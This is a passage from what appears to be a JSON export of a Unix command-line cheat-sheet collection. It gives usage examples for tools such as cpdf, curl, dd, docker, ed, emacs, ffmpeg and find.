direction, writing to out.pdf\ncpdf -shift \"26pt 18mm\" in.pdf -o out.pdf\n\n# Rotate the contents of the pages in in.pdf by ninety degrees and\n# write to out.pdf.\ncpdf -rotate-contents 90 in.pdf -o out.pdf\n\n# Crop the pages in in.pdf to a 600 pts by 400 pts rectangle.\ncpdf -crop \"0 0 600pt 400pt\" in.pdf -o out.pdf\n\n# Encrypt using 128bit PDF encryption using the owner password 'fred'\n# and the user password 'joe'\ncpdf -encrypt 128bit fred joe in.pdf -o out.pdf\n\n# Decrypt using the owner password, writing to out.pdf.\ncpdf -decrypt in.pdf owner=fred -o out.pdf\n\n# Compress the data streams in in.pdf, writing the result to out.pdf.\ncpdf -compress in.pdf -o out.pdf\n\n# Decompress the data streams in in.pdf, writing to out.pdf.\ncpdf -decompress in.pdf -o out.pdf\n\n# List the bookmarks in in.pdf. This would produce:\ncpdf -list-bookmarks in.pdf\n\n# Outputs:\n\n# Add bookmarks in the same form from a prepared file bookmarks.txt to\n# in.pdf, writing to out.pdf.\ncpdf -add-bookmarks bookmarks.txt in.pdf -o out.pdf\n\n# Use the Split style to build a presentation from the PDF in.pdf,\n# each slide staying 10 seconds on screen unless manually advanced.\n# The first page, being a title does not move on automatically, and\n# has no transition effect.\ncpdf -presentation in.pdf 2-end -trans Split -duration 10 -o out.pdf\n\n# Stamp the file watermark.pdf on to each page of in.pdf, writing the\n# result to out.pdf.\ncpdf -stamp-on watermark.pdf in.pdf -o out.pdf\n\n# Add a page number and date to all the pages in in.pdf using the\n# Courier font, writing to out.pdf\ncpdf -topleft 10 -font Courier -add-text \"Page %Page\\nDate %d-%m-%Y\" in.pdf -o out.pdf\n\n# Two up impose the file in.pdf, writing to out.pdf\ncpdf -twoup-stack in.pdf -o out.pdf\n\n# Add extra blank pages after pages one, three and four of a document.\ncpdf -pad-after 1,3,4 in.pdf -o out.pdf\n\n# List the annotations in a file in.pdf to standard output.\ncpdf -list-annotations in.pdf\n\n# Might Produce:\n\n# -- # Annotation text content 1 # -- # -- # Annotation text content 2\n# --\n\n# Copy the annotations from from.pdf to in.pdf, writing to out.pdf.\ncpdf -copy-annotations from.pdf in.pdf -o out.pdf\n\n# Set the document title of in.pdf. writing to out.pdf.\ncpdf -set-title \"The New Title\" in.pdf -o out.pdf\n\n# Set the document in.pdf to open with the Acrobat Viewer's toolbar\n# hidden, writing to out.pdf.\ncpdf -hide-toolbar true in.pdf -o out.pdf\n\n# Set the metadata in a PDF in.pdf to the contents of the file\n# metadata.xml, and write the output to out.pdf.\ncpdf -set-metadata metadata.xml in.pdf -o out.pdf\n\n# Set the document in.pdf to open in Acrobat Viewer showing two\n# columns of pages, starting on the right, putting the result in\n# out.pdf.\ncpdf -set-page-layout TwoColumnRight in.pdf -o out.pdf\n\n# Set the document in.pdf to open in Acrobat Viewer in full screen\n# mode, putting the result in out.pdf.\ncpdf -set-page-mode FullScreen in.pdf -o out.pdf\n\n# Attach the file sheet.xls to in.pdf, writing to out.pdf.\ncpdf -attach-file sheet.xls in.pdf -o out.pdf\n\n# Remove any attachments from in.pdf, writing to out.pdf.\ncpdf -remove-files in.pdf -o out.pdf\n\n# Blacken all the text in in.pdf, writing to out.pdf.\ncpdf -blacktext in.pdf -o out.pdf\n\n# Make sure all lines in in.pdf are at least 2 pts wide, writing to\n# out.pdf.\ncpdf -thinlines 2pt in.pdf -o out.pdf\n\n"
        },
        {
          "name": "cpio",
          "type": "blob",
          "size": 0.1689453125,
          "content": "# Create a specific cpio archive:\nls | cpio --create > <path/to/archive.cpio>\n\n# Extract a specific cpio archive:\ncpio --extract --make-directories < <path/to/archive.cpio>\n"
        },
        {
          "name": "crontab",
          "type": "blob",
          "size": 0.818359375,
          "content": "---\ntags: [ job, scheduler, periodic ]\n---\n# set a shell\nSHELL=/bin/bash\n\n# set a PATH\nPATH=/usr/bin:/usr/sbin:/usr/local/bin\n\n# incorrect way of seeting PATH\nPATH=$PATH:/do/not/do/this\n\n# crontab format\n* * * * *  command_to_execute\n- - - - -\n| | | | |\n| | | | +- day of week (0 - 7) (where sunday is 0 and 7)\n| | | +--- month (1 - 12)\n| | +----- day (1 - 31)\n| +------- hour (0 - 23)\n+--------- minute (0 - 59)\n\n# example entries\n# every 15 min\n*/15 * * * * /home/user/command.sh\n\n# every midnight\n0 0 * * * /home/user/command.sh\n\n# every Saturday at 8:05 AM\n5 8 * * 6 /home/user/command.sh\n\n# compute your crontab periodicity format online\nhttps://crontab.guru/\n\n# be careful with % sign (percent), it has special meaning, see https://crontab.guru/ for explanation\n% signs must be escaped such as \\%\n\n# view log\njournalctl | grep CRON\n"
        },
        {
          "name": "cryptsetup",
          "type": "blob",
          "size": 0.3359375,
          "content": "# To open an encrypted partition /dev/sdb1 (reachable at /dev/mapper/backup):\ncryptsetup open --type luks /dev/sdb1 backup\n\n# To open an encrypted partition /dev/sdb1 using a keyfile (reachable at /dev/mapper/hdd):\ncryptsetup open --type luks --key-file hdd.key /dev/sdb1 hdd\n\n# To close luks container at /dev/mapper/hdd:\ncryptsetup close hdd\n"
        },
        {
          "name": "csplit",
          "type": "blob",
          "size": 0.1767578125,
          "content": "# To split a file based on a pattern:\ncsplit <file> '/PATTERN/'\n\n# To use prefix/suffix to improve output file names:\ncsplit -f 'prefix-' -b '%d.extension' <file> '/PATTERN/' '{*}'\n"
        },
        {
          "name": "cups",
          "type": "blob",
          "size": 0.3271484375,
          "content": "# To manage printers through CUPS:\nhttp://localhost:631 (in web browser)\n\n# To print a file:\nlp <file>\n\n# To display the print queue:\nlpq\n\n# Remove a print job from the queue:\nlprm 545 #or:\nlprm -\n\n# To print log location:\n/var/log/cups\n\n# To reject new jobs:\ncupsreject <printer-name>\n\n# To accept new jobs:\ncupsaccept <printer-name>\n"
        },
        {
          "name": "curl",
          "type": "blob",
          "size": 0.98046875,
          "content": "# To download a file:\ncurl <url>\n\n# To download and rename a file:\ncurl <url> -o <outfile>\n\n# To download multiple files:\ncurl -O <url> -O <url>\n\n# To download all sequentially numbered files (1-24):\ncurl http://example.com/pic[1-24].jpg\n\n# To download a file and pass HTTP authentication:\ncurl -u <username>:<password> <url>\n\n# To download a file with a proxy:\ncurl -x <proxy-host>:<port> <url>\n\n# To download a file over FTP:\ncurl -u <username>:<password> -O ftp://example.com/pub/file.zip\n\n# To get an FTP directory listing:\ncurl ftp://username:password@example.com\n\n# To resume a previously failed download:\ncurl -C - -o <partial-file> <url>\n\n# To fetch only the HTTP headers from a response:\ncurl -I <url>\n\n# To fetch your external IP and network info as JSON:\ncurl http://ifconfig.me/all.json\n\n# To limit the rate of a download:\ncurl --limit-rate 1000B -O <outfile>\n\n# To get your global IP:\ncurl httpbin.org/ip \n\n# To get only the HTTP status code:\ncurl -o /dev/null -w '%{http_code}\\n' -s -I URL\n"
        },
        {
          "name": "cut",
          "type": "blob",
          "size": 0.0859375,
          "content": "# To cut out the third field of text or stdoutput that is delimited by a #:\ncut -d# -f3\n"
        },
        {
          "name": "date",
          "type": "blob",
          "size": 0.9189453125,
          "content": "---\ntags: [ date, time ]\n---\n# To print Abbreviated weekday name:\ndate +\"%a\"\n\n# To print Full month name:\ndate +\"%B\"\n\n# To print ISO date (same as %Y-%m-%d):\ndate +\"%F\"\n\n# To print Time (same as %H:%M:%S):\ndate +\"%T\"\n\n# To print Sunday week number (00 to 53):\ndate +\"%U\"\n\n# To print Monday week number (00 to 53):\ndate +\"%W\"\n\n# To print Time (localized):\ndate +\"%X\"\n\n# To print 4-digit year:\ndate +\"%Y\"\n\n# To print Timezone name:\ndate +\"%Z\"\n# To print the date in a format suitable for affixing to file names:\ndate +\"%Y%m%d_%H%M%S\"\n\n# To convert a Unix timestamp to Date (Linux):\ndate -d @1440359821\n\n# To convert a Unix timestamp to Date (OSX):\ndate -r 1440359821\n\n# To show the current timezone:\ndate +%Z\n\n# To show date in RFC format with TZ offset:\ndate -R\n\n# To show date in UTC/GMT:\ndate -u\n\n# To show date in CET:\nTZ=CET date\n\n# To show the time on the west coast of the US (use tzselect(1) to find TZ):\nTZ='America/Los_Angeles' date\n"
        },
        {
          "name": "dd",
          "type": "blob",
          "size": 1.375,
          "content": "# Read from {/dev/urandom} 2*512 Bytes and put it into {/tmp/test.txt}\n# Note: At the first iteration, we read 512 Bytes.\n# Note: At the second iteration, we read 512 Bytes.\ndd if=/dev/urandom of=/tmp/test.txt count=2 bs=512\n\n# Watch the progress of 'dd'\ndd if=/dev/zero of=/dev/null bs=4KB &; export dd_pid=`pgrep '^dd'`; while [[ -d /proc/$dd_pid ]]; do kill -USR1 $dd_pid && sleep 1 && clear; done\n\n# Watch the progress of 'dd' with `pv` and `dialog` (apt-get install pv dialog)\n(pv -n /dev/zero | dd of=/dev/null bs=128M conv=notrunc,noerror) 2>&1 | dialog --gauge \"Running dd command (cloning), please wait...\" 10 70 0\n\n# Watch the progress of 'dd' with `pv` and `zenity` (apt-get install pv zenity)\n(pv -n /dev/zero | dd of=/dev/null bs=128M conv=notrunc,noerror) 2>&1 | zenity --title 'Running dd command (cloning), please wait...' --progress\n\n# Watch the progress of 'dd' with the built-in `progress` functionality\n# (introduced in coreutils v8.24)\ndd if=/dev/zero of=/dev/null bs=128M status=progress\n\n# DD with \"graphical\" return\ndcfldd if=/dev/zero of=/dev/null bs=500K\n\n# This will output the sound from your microphone port to the ssh target\n# computer's speaker port. The sound quality is very bad, so you will hear a\n# lot of hissing.\ndd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp\n\n# Create a 1MB file with zero allocated blocks:\ndd if=/dev/zero of=foo1 seek=1 bs=1M count=0\n"
        },
        {
          "name": "deb",
          "type": "blob",
          "size": 0.2236328125,
          "content": "---\ntags: [ packaging ]\n---\n# To extract the contents of a .deb file:\nar vx foo.deb  # -> data.tar.gz\ntar xf data.tar.gz\n\n# To install .deb file to a debian like system (e.g: Ubuntu):\nsudo dpkg -i foo.deb\nsudo apt-get install -f\n"
        },
        {
          "name": "df",
          "type": "blob",
          "size": 0.1103515625,
          "content": "# To print free disk space in a human-readable format:\ndf -h\n\n# To print the disk for a given path:\ndf -d <path>\n"
        },
        {
          "name": "dhclient",
          "type": "blob",
          "size": 0.2734375,
          "content": "---\ntags: [ networking ]\n---\n# To release the current IP address:\nsudo dhclient -r\n\n# To obtain a new IP address:\nsudo dhclient\n\n# Running the above in sequence is a common way of refreshing an IP.\n\n# To obtain a new IP address for a specific interface:\nsudo dhclient <interface>\n"
        },
        {
          "name": "diff",
          "type": "blob",
          "size": 0.630859375,
          "content": "# To view the differences between two files:\ndiff -u <file-1> <file-2>\n\n# To view the differences between two directories:\ndiff -ur <dir-1> <dir-2>\n\n# To ignore whitespace:\ndiff -ub <file-1> <file-2>\n\n# To ignore blank lines:\ndiff -uB <file-1> <file-2>\n\n# To ignore the differences between uppercase and lowercase:\ndiff -ui <file-1> <file-2>\n\n# To report whether the files differ:\ndiff -q <file-1> <file-2>\n\n# To report whether the files are identical:\ndiff -s <file-1> <file-2>\n\n# To diff the output of two commands or scripts:\ndiff <(command1) <(command2)\n\n# To generate a patch file from two files:\ndiff -Naur <file-1> <file-2> > <patch-file>\n"
        },
        {
          "name": "distcc",
          "type": "blob",
          "size": 1.0244140625,
          "content": "# INSTALL\n# ==============================================================================\n# Edit /etc/default/distcc and set theses vars\n# STARTDISTCC=\"true\"\n# ALLOWEDNETS=\"127.0.0.1 192.168.1.0/24\"# Your computer and local computers\n# #LISTENER=\"127.0.0.1\"# Comment it\n# ZEROCONF=\"true\"# Auto configuration\n\n# REMEMBER 1:\n# Start/Restart your distccd servers before using one of these commands.\n# service distccd start\n\n# REMEMBER 2:\n# Do not forget to install on each machine DISTCC.\n# No need to install libs ! Only main host need libs !\n\n# USAGE\n# ==============================================================================\n\n# Run make with 4 thread (a cross network) in auto configuration.\n# Note: for gcc, Replace CXX by CC and g++ by gcc\nZEROCONF='+zeroconf' make -j4 CXX='distcc g++'\n\n# Run make with 4 thread (a cross network) in static configuration (2 ip)\n# Note: for gcc, Replace CXX by CC and g++ by gcc\nDISTCC_HOSTS='127.0.0.1 192.168.1.69' make -j4 CXX='distcc g++'\n\n# Show hosts aviables\nZEROCONF='+zeroconf' distcc --show-hosts\n"
        },
        {
          "name": "distrobox",
          "type": "blob",
          "size": 1.3076171875,
          "content": "---\ntags: [ container ]\n---\n# Create a distrobox using the Ubuntu Linux image:\ndistrobox-create <container_name></container_name> --image <ubuntu:latest>\n\n# List all distrobox containers with verbose information:\ndistrobox-list --verbose\n\n# Enter a distrobox:\ndistrobox-enter <container-name>\n\n# Execute command on the host, while inside of a container:\ndistrobox-host-exec <command>\n\n# Export an app (atom) from the container to the host (will show up in your host system's application list):\ndistrobox-export --app <atom> --extra-flags \"--foreground\"\n\n# Export a binary (ranger) from the container to the host:\ndistrobox-export --bin </usr/bin/ranger> --export-path <$HOME/.local/bin>\n\n# Export a service (syncthing) from container to the host (`--sudo` will run the service as root inside the container):\ndistrobox-export --service <syncthing> --extra-flags \"--allow-newer-config\" --sudo\n\n# Unexport/delete an exported app (atom):\ndistrobox-export --app <atom> --delete\n\n# Upgrade a container using the container's package manager:\ndistrobox-upgrade <container_name>\n\n# Clone a distrobox:\ndistrobox-create --clone <container_name> <cloned_container_name>\n\n# Stop a distrobox container:\ndistrobox-stop <container-name>\n\n# Remove a distrobox forcefully (to remove normally, don't include `--force`):\ndistrobox-rm <container_name> --force\n"
        },
        {
          "name": "dnf",
          "type": "blob",
          "size": 0.44921875,
          "content": "---\ntags: [ packaging ]\n---\n# To install a package:\ndnf install <package>\n\n# To find packages matching <phrase>:\ndnf search <phrase>\n\n# To find which package provides an executable:\ndnf provides <executable>\n\n# The following are available after installing \"dnf-plugins-core\"\n\n# To download a package:\ndnf download <package>\n\n# To install the build dependencies for a SRPM or from a .spec file:\ndnf builddep <file>\n\n# List installed packages\ndnf list installed\n"
        },
        {
          "name": "docker",
          "type": "blob",
          "size": 2.8515625,
          "content": "# To start the docker daemon:\ndocker -d\n\n# To build a docker image:\ndocker build -t <image-tag-name> <path-of-Dockerfile>\n\n# To start a container with an interactive shell:\ndocker run -ti <image-name> /bin/bash\n\n# To run a docker container in the background:\ndocker run -d <image-name>\n\n# To \"shell\" into a running container (docker-1.3+):\ndocker exec -ti <container-name> bash\n\n# To inspect a running container:\ndocker inspect <container-name> (or <container-id>)\n\n# To get the process ID for a container:\ndocker inspect --format {{.State.Pid}} <container-name-or-id>\n\n# To list (and pretty-print) the current mounted volumes for a container:\ndocker inspect --format='{{json .Volumes}}' <container-id> | python -mjson.tool\n\n# To copy files/folders between a container and your host:\ndocker cp foo.txt mycontainer:/foo.txt\n\n# To list currently running containers:\ndocker ps\n\n# To list all containers:\ndocker ps -a\n\n# To remove all stopped containers:\ndocker container prune\n\n# To remove all stopped containers:\ndocker rm $(docker ps -qa)\n\n# To list all images:\ndocker images\n\n# To only see all images id:\ndocker image ls -q\n\n# To remove all untagged images:\ndocker rmi $(docker images | grep \"^<none>\" | awk '{print $3}')\n\n# To remove all volumes not used by at least one container:\ndocker volume prune\n\n# To save image as tar archive:\ndocker save -o <archive-name>.tar <image-name>\n\n# To restore image from a saved tar archive:\ndocker load -i <archive-name>.tar\n\n# To remove an image:\ndocker image rm <image-name-or-id>\n\n# To tag an image:\ndocker image tag <image-name>:<tag-name> <image-name>:<new-tag-name>\n\n# To login into hub.docker.com:\ndocker login\n\n# To push a docker image into dockerhub repository:\ndocker push <image-name>:<image-tag-name>\n\n# List all networks daemon knows about:\ndocker network ls\n\n# Create a specific network:\ndocker network create \"<network_name>\"\n\n# Connect a specific container to a network:\ndocker network connect \"<network_id|name>\" \"<container_id|name>\"\n\n# Disconnect a specific container from network:\ndocker network disconnect \"<network_id|name>\" \"<container_id|name>\"\n\n# To see the logs of a background or stopped container:\ndocker logs <container-id>\n\n# To publish a port of container on localhost:\ndocker run -p <localhost-port>:<container-port> <image-name>\n\n# To create a docker volume:\ndocker volume create <volume-name>\n\n# To see information of a docker volume:\ndocker volume inspect <volume-name>\n\n# To use a volume in the container:\ndocker run -v <volume-name>:<folder-path-in-container> <image>\n\n# To link current folder between host and container for development:\ndocker run <image-name> -v $(pwd):<folder-path-in-container> <image>\n\n# To copy a file from the running container to host mechine:\ndocker cp <container-id>:<path/to/file> <host/copy/path>\n\n# To copy a file from host mechine to the running container:\ndocker cp <host/copy/path> <container-id>:<path/to/file>\n"
        },
        {
          "name": "docker-compose",
          "type": "blob",
          "size": 0.9609375,
          "content": "---\nsyntax: bash\ntags: [ container, docker ]\n---\n# To start all containers defined in the docker-compose.yml file:\ndocker-compose up\n\n# To start all containers defined in a given compose file:\ndocker-compose -f <path/to/compose_file.yml> up\n\n# To start all containers in the background:\ndocker-compose up -d\n\n# To rebuild the images before starting all containers:\ndocker-compose up --build\n\n# To start only specific containers:\ndocker-compose up <container_name_1> <container_name_2>\n\n# To list all running containers:\ndocker-compose ps\n\n# To stop all running containers:\ndocker-compose stop\n\n# To stop and remove all containers, networks, images, and volumes:\ndocker-compose down --rmi all --volumes\n\n# To follow logs output from all containers:\ndocker-compose logs --follow\n\n# To follow logs output from a specific container:\ndocker-compose logs --follow <container_name>\n\n# To display the environment variables used by a running container:\ndocker-compose run <container_name> env\n"
        },
        {
          "name": "dpkg",
          "type": "blob",
          "size": 0.306640625,
          "content": "---\ntags: [ packaging ]\n---\n# To install or upgrade a package:\ndpkg -i <deb-file>\n\n# To remove a package (including configuration files):\ndpkg -P <deb-file>\n\n# To list all installed packages with versions and details:\ndpkg -l\n\n# To determine whether a Debian package is installed:\ndpkg -s <deb-file> | grep Status\n"
        },
        {
          "name": "du",
          "type": "blob",
          "size": 0.4736328125,
          "content": "# To sort directories/files by size:\ndu -sk *| sort -rn\n\n# To show cumulative human-readable size:\ndu -sh\n\n# To show cumulative human-readable size and dereference symlinks:\ndu -shL\n\n# Show apparent size instead of disk usage (so sparse files will show greater\n# than zero):\ndu -h --apparent-size\n\n# To sort directories/files by size (human-readable):\ndu -sh * | sort -rh \n\n# To list the 20 largest files and folders under the current working directory:\ndu -ma | sort -nr | head -n 20\n"
        },
        {
          "name": "dwm",
          "type": "blob",
          "size": 1.48046875,
          "content": "Basic\n=====\n# launch terminal.\n[Shift]+[Mod]+[Enter]\n   \n# show/hide bar.\n[Mod]+[b]               \n\n# dmenu for running programs like the x#www#browser.\n[Mod]+[p]               \n\n # push acive window from stack to master, or pulls last used window from stack onto master.\n[Mod]+[Enter]          \n\n # focus on next/previous window in current tag.\n[Mod] + [j / k]        \n\n # increases / decreases master size.\n[Mod] + [h / l]        \n\n\nNavigation\n==========\n# moves your focus to tag 2.\n[Mod]+[2]      \n\n# move active window to the 2 tag.\n[Shift]+[Mod]+[2]      \n\n # increases / decreases number of windows on master\n[Mod] + [i / d]        \n\n# move focus between screens (multi monitor setup)\n[Mod] + [, / .]        \n\n# move active window to different screen.\n[Shift]+[Mod]+[, / .]   \n\n# view all windows on screen.\n[Mod]+[0]               \n\n# make focused window appear on all tags.\n[Shift]+[Mod]+[0]       \n\n# kill active window.\n[Shift]+[Mod]+[c]      \n\n# quit dwm cleanly.\n[Shift]+[Mod]+[q]       \n\n\nLayout\n======\n# tiled mode. []=\n[Mod]+[t]               \n\n# floating mode. ><>\n[Mod]+[f]               \n\n# monocle mode. [M] (single window fullscreen)\n[Mod]+[m]              \n\n\nFloating\n========\n# to resize the floating window.\n[Mod]+[R M B]           \n\n# to move the floating window around.\n[Mod]+[L M B]           \n\n# toggles to the previous layout mode.\n[Mod]+[Space]           \n\n# to make an individual window float.\n[Mod]+[Shift]+[Space]  \n\n# to make an individual window un#float.\n[Mod]+[M M B]           \n"
        },
        {
          "name": "ed",
          "type": "blob",
          "size": 3.22265625,
          "content": "---\ntags: [ ed ]\n---\n\n# File and buffer management\n\n:e {file}       load file to buffer\n:q              quit\n:Q              quit without saving changes\n:f {name}       change buffer name\n:w              write to file using current buffer name \n:w {file}       write buffer to new file\n:wq             write buffer to existing file and exit\n\n# Line-oriented addressing and movement \n#   `ed' uses line addresses to move around and operate within a buffer\n#   Move to or operate on single lines by entering the line number\n#   Move to or operate on ranges of lines using comma-separated values\n#   The active line is always set to the last number of the range entered\n\n. or p          display current line\nn               display current line with line number\n\n1,$ or ,        range indicating the entire buffer; displays final line\n\n3 or 3p         move to line 3 of the buffer and display\n3n              move to line 3 of the buffer and display with line number\n\n1,$p or ,p      display entire buffer without line numbers\n1,$n or ,n      display entire buffer with line numbers\n\n15,25p          display lines 15 through 25 of the buffer\n15,25n          display lines 15 through 25 of the buffer with line numbers\n\n# Line editing commands\n#   All commands can be prefixed with line addresses/ranges\n\ni               start editing by inserting new text before the current line\na               start editing by inserting new text after the current line\nc               clear contents of current line and replace with new text\n.               a period [.] enterd alone on a new line ends the active edit\n\nd               delete current line\n1,3d            delete lines 1 through 3\n\nu               undo last edit\n\nr {file}        read contents of {file} into buffer after current line\nr !{command}    read output of {command} into buffer after current line\n\n# Example of a simple editing session\n\ne test.txt                      edit file \"test.txt\"\n45                              `ed' returns character count as confirmation\n1,3n                            display lines 1 through 3 with line numbers\n1    This is line 1           \n2    This is line 2\n3    This is line 3\n2c                              change line 2\nI am typing a new line 2\n.                               end active edit \n1,3n                            display lines 1 thorugh 3 with line numbers\n1    This is line 1\n2    I am typing a new line 2\n3    This is line 3\nwq                              write file \"test.txt\" and exit\n\n# Search\n#   Accepts regexps in search strings\n\ng/foo/          search all lines for `foo' and display matching lines\ng/foo/n         search all lines for `foo'; display with line numbers\n\n4,9/foo/        search lines 1 through 5 for `foo' and display matches \n4,9/foo/n       search lines 1 through 5 for `foo'; display with line numbers\n\n# Replace\n#   Accepts regexps in search and replace strings\n\ns/foo/bar       replace first instance of `foo' with `bar' on the current line\ns/foo/bar/{n}   replace {n}th instance of `foo' with `bar' on the current line\ns/foo/bar/g     replace all instances of `foo' with `bar' on the current line\n\n1,4/foo/bar/g   replace all instances of `foo' with `bar` in lines 1 through 4\n\n,s/foo/bar/g    replace all instances of `foo' with `bar' in the entire buffer\n"
        },
        {
          "name": "emacs",
          "type": "blob",
          "size": 2.09375,
          "content": "# Running emacs\n\n  GUI mode            $ emacs\n  Terminal mode       $ emacs -nw\n\n# Basic usage\n\n  Indent              Select text then press TAB\n  Cut                 C-w\n  Copy                M-w\n  Paste (\"yank\")      C-y\n  Begin selection     C-SPACE\n  Search/Find         C-s\n  Replace             M-% (M-SHIFT-5)\n  Save                C-x C-s\n  Save as             C-x C-w\n  Load/Open           C-x C-f\n  Undo                C-x u\n  Highlight all text  C-x h\n  Directory listing   C-x d\n  Cancel a command    C-g\n  Font size bigger    C-x C-+\n  Font size smaller   C-x C--\n\n# Buffers\n\n  Split screen vertically                         C-x 2\n  Split screen vertically with 5 row height       C-u 5 C-x 2\n  Split screen horizontally                       C-x 3\n  Split screen horizontally with 24 column width  C-u 24 C-x 3\n  Revert to single screen                         C-x 1\n  Hide the current screen                         C-x 0\n  Move to the next screen                         C-x o\n  Kill the current buffer                         C-x k\n  Select a buffer                                 C-x b\n  Run command in the scratch buffer               C-x C-e\n\n# Navigation ( backward / forward )\n  \n  Character-wise                                  C-b , C-f\n  Word-wise                                       M-b  , M-f\n  Line-wise                                       C-p , C-n\n  Sentence-wise                                   M-a  , M-e\n  Paragraph-wise                                  M-{ , M-}\n  Function-wise                                   C-M-a , C-M-e\n  Line beginning / end                            C-a , C-e\n\n# Other stuff\n\n  Open a shell         M-x eshell\n  Goto a line number   M-x goto-line\n  Word wrap            M-x toggle-word-wrap\n  Spell checking       M-x flyspell-mode\n  Line numbers         M-x linum-mode\n  Toggle line wrap     M-x visual-line-mode\n  Compile some code    M-x compile\n  List packages        M-x package-list-packages\n\n# Line numbers\n\n  To add line numbers and enable moving to a line with C-l:\n\n    (global-set-key \"\\C-l\" 'goto-line)\n    (add-hook 'find-file-hook (lambda () (linum-mode 1)))\n"
        },
        {
          "name": "env",
          "type": "blob",
          "size": 0.44921875,
          "content": "---\nsyntax: bash\n---\n# To list the exported variables of the current environment along with their values:\nenv\n\n# To set an environment variable and run a command:\nenv <variable>=<value> <command>\n\n# To set multiple environment variables and run a command:\nenv <variable_1>=<value> <variable_2>=<value> <command>\n\n# To remove an environment variable and run a command:\nenv -u <variable> <command>\n\n# To clear the environment and run a command:\nenv -i <command>\n"
        },
        {
          "name": "ethtool",
          "type": "blob",
          "size": 0.3740234375,
          "content": "---\nsyntax: bash\ntags: [networking] \n---\n# To show statistics for the selected interface:\nethtool -S <interface>\n\n# To show interface permanent address:\nethotool -P <interface>\n\n# To set interface speed:\nethtool -s <interface> [ speed %d ]\n\n# To set interface autonegotiation:\nethtool -s <interface> [ autoneg on|off ]\n\n# To get interface errors:\nethtool -S <interface> | grep error\n"
        },
        {
          "name": "exiftool",
          "type": "blob",
          "size": 0.0576171875,
          "content": "# Delete all metadata in a file\nexiftool -all= <file_name>\n"
        },
        {
          "name": "export",
          "type": "blob",
          "size": 0.1015625,
          "content": "# To show current shell attributes:\nexport\n\n# To export an environment variable:\nexport VARNAME=\"value\"\n"
        },
        {
          "name": "fd",
          "type": "blob",
          "size": 0.4365234375,
          "content": "# Simple search:\nfd <search query>\n\n# Specifying the root directory for the search:\nfd <search query> <directory>\n\n# Searching for a particular file extension:\nfd -e <file extension> <search query>\n\n# Searching for a particular file name:\nfd -g <file name>.<file extension>\n\n# Search for hidden and ignored files:\nfd -H <search query>\n\n# Excluding specific files or directories:\nfd -E <file or directories which should be excluded> <search query>\n"
        },
        {
          "name": "ffmpeg",
          "type": "blob",
          "size": 1.4736328125,
          "content": "# To print file metadata:\nffmpeg -i <file>\n\n# To convert all m4a files to mp3\nfor f in *.m4a; do ffmpeg -i \"$f\" -acodec libmp3lame -vn -b:a 320k \"${f%.m4a}.mp3\"; done\n\n# To convert video from .foo to .bar\n# -g : GOP, for searchability\nffmpeg -i input.foo -vcodec bar -acodec baz -b:v 21000k -b:a 320k -g 150 -threads 4 output.bar\n\n# To convert image sequence to video:\nffmpeg -r 18 -pattern_type glob -i '*.png' -b:v 21000k -s hd1080 -vcodec vp9 -an -pix_fmt yuv420p -deinterlace output.ext\n\n# To combine video and audio into one file\nffmpeg -i video.ext -i audio.ext -c:v copy -c:a copy output.ext\n\n# To add ass subtitle to the video\nffmpeg -i input_video.mp4 -vf ass=sub.ass output_video_subtitles.mp4\n\n# To convert webm to mp4\nffmpeg -i input_video.webm output_video.mp4\n\n# To convert mp4 to mov\nffmpeg -i input_video.mp4 -acodec copy -vcodec copy -f mov output_video.mov\n\n# To convert mov to mp4\nffmpeg -i input_video.mov -vcodec copy -acodec copy output_video.mp4\n\n# Listen to 10 seconds of audio from a video file\n#\n# -ss : start time\n# -t  : seconds to cut\n# -autoexit : closes ffplay as soon as the audio finishes\nffmpeg -ss 00:34:24.85 -t 10 -i path/to/file.mp4 -f mp3 pipe:play | ffplay -i pipe:play -autoexit\n\n# To combine audio and video from N files:\n# See also https://stackoverflow.com/questions/7333232/how-to-concatenate-two-mp4-files-using-ffmpeg\ncat mylist.txt\nfile '/path/to/file1'\nfile '/path/to/file2'\nfile '/path/to/file3'\n    \nffmpeg -f concat -safe 0 -i mylist.txt -c copy output.mp4\n"
        },
        {
          "name": "find",
          "type": "blob",
          "size": 2.779296875,
          "content": "# To find files following symlinks (otherwise the symlinks are not followed):\nfind -L . -type f\n\n# To find files by case-insensitive extension (ex: .jpg, .JPG, .jpG):\nfind . -iname \"*.jpg\"\n\n# To find directories:\nfind . -type d\n\n# To find files:\nfind . -type f\n\n# To find files by octal permission:\nfind . -type f -perm 777\n\n# To find files with setuid bit set:\nfind . -xdev \\( -perm -4000 \\) -type f -print0 | xargs -0 ls -l\n\n# To find files newer than 1 day old and copy elsewhere (remove -p flag in xargs to not be asked):\nfind . -type f -ctime -1 -print0 | xargs -0 -p cp -t <dir>\n# or:\nfind . -type f -ctime -1 -print0 | xargs -0 -p -J % cp % <dir>\n\n# To find files with extension '.txt' and remove them:\nfind ./path/ -name '*.txt' -delete\n\n# To find files with tilde as postfix and remove them:\nfind ./path/ -name '*~' -delete\n\n# To find files with extension '.txt' and dump their contents:\nfind ./path/ -name '*.txt' -exec cat '{}' \\;\n\n# To find files with extension '.txt' and look for a string into them:\nfind ./path/ -name '*.txt' | xargs grep 'string'\n\n# To find files with size bigger than 5 Mebibyte and sort them by size:\nfind . -size +5M -type f -print0 | xargs -0 ls -Ssh | sort -z\n\n# To find files bigger than 2 Megabyte and list them:\nfind . -type f -size +200000000c -exec ls -lh {} \\; | awk '{ print $9 \": \" $5 }'\n\n# To find files modified more than 7 days ago and list file information:\nfind . -type f -mtime +7d -ls\n\n# To find symlinks owned by a user and list file information:\nfind . -type l -user <username-or-userid> -ls\n\n# To search for and delete empty directories:\nfind . -type d -empty -exec rmdir {} \\;\n\n# To search for directories named build at a max depth of 2 directories:\nfind . -maxdepth 2 -name build -type d\n\n# To search all files who are not in .git directory:\nfind . ! -iwholename '*.git*' -type f\n\n# To find all files that have the same node (hard link) as MY_FILE_HERE:\nfind . -type f -samefile MY_FILE_HERE 2>/dev/null\n\n# To find all files in the current directory and modify their permissions:\nfind . -type f -exec chmod 644 {} \\;\n\n# To find all files changed in last 2 days:\nfind . -type f -ctime -48h\nfind . -type f -ctime -2\n# Or created in last 2 days:\nfind . -type f -Btime -2\n# Or accessed in last 2 days:\nfind . -type f -atime -2\n\n# To find and rename (imperfect) all files and dirs that have a comma in the\n# name (dry-run):\nfind . -name '*,*' | while read f; do echo mv \"$f\" \"${f//,/}\"; done\n\n# To find all broken links. Note -L returns a file unless it is a broken link:\nfind -L /usr/ports/packages -type l\n\n# To find and run multiple shell commands (without multiple execs):\n# See: 